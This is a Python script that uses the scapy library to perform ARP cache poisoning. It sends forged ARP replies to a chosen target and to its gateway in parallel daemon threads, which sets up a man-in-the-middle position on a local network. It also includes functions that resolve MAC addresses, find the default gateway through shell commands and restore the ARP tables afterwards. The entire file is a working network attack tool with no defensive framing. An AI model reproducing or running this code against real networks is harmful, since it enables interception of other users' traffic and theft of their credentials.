import os
import sys
import time
import threading
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp, sendp
from termcolor import colored


def arp_poison(target_ip, gateway_ip, interval):
    # Get MAC address of target
    target_mac = get_mac(target_ip)

    # Construct ARP packet
    arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation

    # Indefinitely send packets
    while True:
        send(arp, verbose=0)
        print(colored("[ARP] Sent packet to {} from {}".format(target_ip, gateway_ip), "light_grey"))
        time.sleep(interval)


def get_mac(ip):
    arp_request_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    # send and await response
    answer = srp(arp_request_pkt, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac


def revert_arp_table(target_ip, gateway_ip):
    # Retrieve max of target and gateway
    mac_target = get_mac(target_ip)
    mac_gateway = get_mac(gateway_ip)

    restoring_pkt = ARP(op=2, pdst=gateway_ip, hwdst=mac_gateway, psrc=target_ip, hwsrc=mac_target)

    sendp(restoring_pkt)


def get_gateway_ip():
    # Determine the OS
    platform_id = sys.platform

    if platform_id == "win32":  # Windows
        return os.popen("ipconfig | findstr Default").read().split()[-1]
    else:  # Linux
        return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()


def start(target, interval, gateway=None):
    if target is None:  # Validate target input
        print("Error! Unspecified target.")
        sys.exit(1)
    if gateway is None:
        gateway = get_gateway_ip()
        print(gateway)

    # Poison the target's and gateway's ARP cache to establish a MITM attack
    t1 = threading.Thread(target=lambda: arp_poison(target, gateway, interval))
    t2 = threading.Thread(target=lambda: arp_poison(gateway, target, interval))

    # Set as daemon threads to allow main thread to exit
    t1.daemon = True
    t2.daemon = True

    # Simultaneously run the threads
    t1.start()
    t2.start()

    print(colored("Started ARP poisoning.", "light_grey"))
